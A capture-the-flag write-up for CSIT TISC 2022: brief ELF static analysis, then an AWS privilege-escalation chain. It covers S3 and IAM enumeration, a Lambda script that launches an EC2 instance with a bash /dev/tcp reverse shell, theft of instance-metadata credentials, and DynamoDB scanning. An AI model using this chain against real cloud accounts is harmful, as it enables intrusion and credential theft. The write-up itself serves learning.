# CSIT TISC 2022 (2)
## Level 4a : One Knock Away [attempted but did not complete]
One of our clients' server was recently compromised by PALINDROME. We recovered one suspicious artifact from the server. Can you figure out what it is? (The file can only be loaded in a specific VM!) 

### Basic Static Analysis
- For the basic static analysis above, Detect-It-Easy, linux `file` and `readelf` command was used. 

#### File Classification
- We can gather a few information, this is a :  
	- 64-bit ELF file for Ubuntu 20.04.1, 
	- likely not packed 
	- the `REL` flag set (relocatable file) more on the differences can be found [here](https://carsontang.github.io/unix/2013/06/01/guide-to-object-file-linking/).

#### Looking into `.dynsym`
- Following this [blog](https://www.intezer.com/blog/malware-analysis/elf-malware-analysis-101-initial-analysis/) we focused our search on the following 3 symbol types.

```
readelf -s | grep -i 'func'
readelf -s | grep -i 'object'
readelf -s | grep -i 'file'
```

### Reverse Engineering
- The author CY1603 has been nice by putting a `dont_need_to_reverse_this` and hence we will do what the author has told us to. We will also not be reversing `dffqa` and `print_flag` as they seem to just be worker functions for `dont_need_to_reverse_this`.

## Level 4b : CloudyNekos 
We have received intelligence that Palindrome has started a global computing infrastructure to be made available to its agent to spin up C2 instances. They relied on Cloud Service Providers like AWS to provide computing resources for its agents. They have their own custom built access system e-service portal that generate short-lived credentials for their agents to use their computing infrastructure. It was said that their access system e-service was diguised as a blog site.

We need your help to access their computing resources and exfiltrate any meaningful intelligence for us.

### Recon
#### Mapping Visible Content

![[Pasted image 20220830205853.png]]
![[Pasted image 20220831115350.png]]
![[Pasted image 20220831121057.png]]

#### Content Exploration
- Based on the comment found above, we can guess the address of the S3 bucket to be : `palindromecloudynekos.s3.amazonaws.com`

![[Pasted image 20220831123947.png]]

#### Looking for Hidden Content
##### Feroxbuster
```
feroxbuster -u https://d20whnyjsgpc34.cloudfront.net/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -o big_ferox -x html
```

- Nothing interesting was found, just the error page and `/soap` is likely the API endpoint to call the S3 bucket.

![[Pasted image 20220831120453.png]]

#### S3 Bucket Enumeration
- Following this [guide](https://medium.com/@narenndhrareddy/misconfigured-aws-s3-bucket-enumeration-7a01d2f8611b) we will need to install aws-cli on our Kali machine first then create an AWS account and generate a secret key before proceeding with below. 
- Next we list the content of the bucket using the following command: 

```
aws s3 ls s3://palindromecloudynekos
```

![[Pasted image 20220831142716.png]]

- Then we want to see what objects are in the folders

```
aws s3api list-objects --bucket palindromecloudynekos
```

```
{
    "Contents": [
        {
            "Key": "api/notes.txt",
            "LastModified": "2022-08-23T13:16:20.000Z",
            "ETag": "\"b65f26503b0dd488334582aa21f7bda4\"",
            "Size": 432,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "error.html",
            "LastModified": "2022-08-23T13:16:20.000Z",
            "ETag": "\"9771d7ba5b393dcef59ddb260cecc6bc\"",
            "Size": 34,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "img/photo1.jpg",
            "LastModified": "2022-07-22T10:02:45.000Z",
            "ETag": "\"9e620e851f5fae15e5637cc914548406\"",
            "Size": 404845,
            "StorageClass": "STANDARD"
        },
        ...
        {
            "Key": "index.html",
            "LastModified": "2022-08-23T13:16:20.000Z",
            "ETag": "\"b299661e57fff70507663e91f2958410\"",
            "Size": 2257,
            "StorageClass": "STANDARD"
        }
    ]
}
```

- `/api/notes.txt` looks particularly interesting, so we will attempt to download it with the aws-cli. The content of notes.txt is shown below.

```
aws s3api get-object --bucket palindromecloudynekos --key api/notes.txt notes.txt
```

![[Pasted image 20220831143504.png]]

#### Understanding `notes.txt`
- To understand notes.txt, we must first know what the link `https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent` is about. 
- We noticed a 'execute-api' and began to searched the AWS [documentation](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html). From, the documentation we know that the above link is a REST API Invocation of Amazon API Gateway. 
- This corresponds to the content in notes.txt about invoking the API. We then invoked the API as per instruction and we get the follwing request.

#### Scout Suite Enumeration
```
scout aws --access-key-id <access key> --secret-access-key <secret key>
```

![[Pasted image 20220831160527.png]]

- We noticed an interesting VPC with the name palindrome.

![[Pasted image 20220831160751.png]]
![[Pasted image 20220831160829.png]]

- The command below is based on this [stackoverflow thread](https://stackoverflow.com/questions/48830793/aws-vpc-identify-private-and-public-subnet), confirms that the palindrome VPC has an internet gateway.

```
aws ec2 describe-route-tables  --query "RouteTables[].Routes[]" --filter Name=association.subnet-id,Values=subnet-0aa6ecdf900166741
```

![[Pasted image 20220831193916.png]]

#### Permission Enumeration 
- With reference to this [guide](https://pentestbook.six2dez.com/enumeration/cloud/aws), we start with enumerating the permissions of this account. In this enumeration we cross referenced with 3 different sources - [[#enumerate-iam]], [[#Pacu iam__enum_permissions]] and [[#Pacu iam__bruteforce_permissions]] to get a list of permissions found in [[#Consolidated Permissions Enumerated]].

##### enumerate-iam 
- Using the tool [enumerate-iam](https://github.com/andresriancho/enumerate-iam), we attempted to bruteforce

```
python enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY --region ap-southeast-1
```

![[Pasted image 20220901234011.png]]
![[Pasted image 20220901233002.png]]
![[Pasted image 20220901232845.png]]

##### Pacu `iam__bruteforce_permissions`
- We used the tool [pacu](https://github.com/RhinoSecurityLabs/pacu) by RhinoSecurityLabs to do an additional bruteforce on IAM permissions.

```
run iam__bruteforce_permissions
```

![[Pasted image 20220901105417.png]]

##### Pacu `iam__enum_permissions`

```
run iam__enum_permissions
whoami
```

![[Pasted image 20220902124800.png]]

- These are the additional permissions that were enumerated.

![[Pasted image 20220902151322.png]]

##### Roles Permission Enumeration
- Based on the result of Pacu's `iam__enum_permissions` , we can see that current user has `iam:PassRole` to `lambda_agent_development_role` Hence we will need to find out more about the role and it's permission.

```
# to get policy-arn
aws iam list-attached-role-policies --role-name lambda_agent_development_role --profile temp

aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2 --profile temp
```

![[Pasted image 20220902202543.png]]
![[Pasted image 20220902152807.png]]

- Then we see that there is another PassRole to 

```
aws iam list-attached-role-policies --role-name ec2_agent_role --profile temp

aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agentrole --version-id v2 --profile temp
```

![[Pasted image 20220902202427.png]]
![[Pasted image 20220902202509.png]]

##### Consolidated Permissions Enumerated
- The results from both were largely similar but as the list used in enumeration is different, there are some differences.
- Below is the consolidated permissions of all the related roles.

### Formulating Attack Chain
- From our enumeration above and reference to [hackingthe.cloud](https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/), it seems like our compromised user can create an EC2 Instance by making use of the lambda function with which we can get the AWS Access and Secret Key of the role `ec2_agent_role` from `169.254.169.254/metadata/latest` and then get to Dynamo DB with the credentials.

#### Lambda Script to Create EC2 Instance
- The python script below is used to create an EC2 instance with lambda. 
- In this script below, we added an `init_scipt` to tell the 

> `IamInstanceProfile` is very Important here as it is required to get access to the IAM role. Without it, the instance will still be created, but it will not be attached to a role and we will not have this page `/latest/meta-data/iam/`.

>"Open Source" AMI Image Id like Amazon Linux and Ubuntu AMIs are uniformed across all users and we can get it by : 
> 1. Registering an AWS account and look for it at the create EC2 form.
> 2. Referencing [AWS AMI page](https://aws.amazon.com/amazon-linux-ami/) or [Ubuntu Cloud Images page](https://cloud-images.ubuntu.com/locator/ec2/).

```python
import boto3

REGION = 'ap-southeast-1' 
AMI = 'ami-08569b978cc4dfa10'
INSTANCE_TYPE = 't2.micro'
SUBNET_ID = 'subnet-0aa6ecdf900166741'

EC2 = boto3.client('ec2', region_name=REGION)

def lambda_handler(event, context):
    init_script = """#!/bin/bash
                   bash -i >& /dev/tcp/<ip address>/8080 0>&1                
    """

    instance = EC2.run_instances(
        ImageId=AMI,
        InstanceType=INSTANCE_TYPE,
        SubnetId=SUBNET_ID,
        MinCount=1, 
        MaxCount=1,
        TagSpecifications=[{'ResourceType': 'instance','Tags': [{"Key": "agent", "Value": "user-9d084cfc30dc44a8b84e9cfe79007c72"}]}],
        UserData=init_script
        IamInstanceProfile={'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'},
    )

    print("New instance created.")
    instance_id = instance['Instances'][0]['InstanceId']
    print(instance_id)

    return instance_id
```

#### Creating and Invoking Lambda
- Based on the permissions above, the compromsed user only has permissions to create and invoke lambda resources with the following name `arn:aws:lambda:ap-southeast-1:<account id>:function:$(aws:username)-*` hence we will need to create a function with function name `<username>-<own function name>`

```
aws lambda create-function --function-name <username>-SI --role arn:aws:iam::<account-id>:role/lambda_agent_development_role --runtime python3.9 --handler <name of file>.<handler> --profile temp --zip-file fileb://SI.py.zip
```

![[Pasted image 20220902235022.png]]

- After creating the lambda functin above, we can now invoke the lambda function with the following command : 

```
aws lambda invoke --function-name <username>-SI outfile --profile temp
```

![[Pasted image 20220902235041.png]]

#### Getting Reverse Shell
- We have our own EC2 instance already set up to wait for the incoming reverse shell triggered by the `init_scipt`.

![[Pasted image 20220902235058.png]]

#### Post Exploitation
- Then from our Reverse Shell, we can curl the URL below : 

```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_agent_role
```

- This gives us the temporary credentials to `ec2_agent_role`. 

![[Pasted image 20220903022328.png]]

- We verify that the credentials are for ec2_agent_role with : 

```
aws sts get-caller-identity
```

![[Pasted image 20220903022720.png]]

- The now we start with querying the Dynamodb.

```
aws dynamodb list-tables --profile ec2agent

aws dynamodb describe-table --table-name flag_db --profile ec2agent

aws dynamodb scan --table-name flag_db --profile ec2agent
```
